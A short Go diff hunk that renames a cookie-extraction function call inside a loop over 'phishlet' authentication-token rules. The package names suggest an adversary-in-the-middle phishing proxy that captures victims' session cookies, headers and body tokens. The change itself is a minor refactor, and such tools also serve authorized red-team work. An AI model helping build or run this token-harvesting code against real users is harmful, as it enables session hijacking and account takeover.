@@ -63,7 +63,7 @@ func (c *connection) extractTokens(resp *http.Response) {
 	for _, rule := range c.phishlet.AuthTokens {
 		switch rule.Type {
 		case aitm.TokenTypeCookie:
-			updated = extractCookieToken(c.session, cookies, rule) || updated
+			updated = extractCookie(c.session, cookies, rule) || updated
 		case aitm.TokenTypeHTTPHeader:
 			updated = extractHeaderToken(c.session, resp, rule) || updated
 		case aitm.TokenTypeBody:
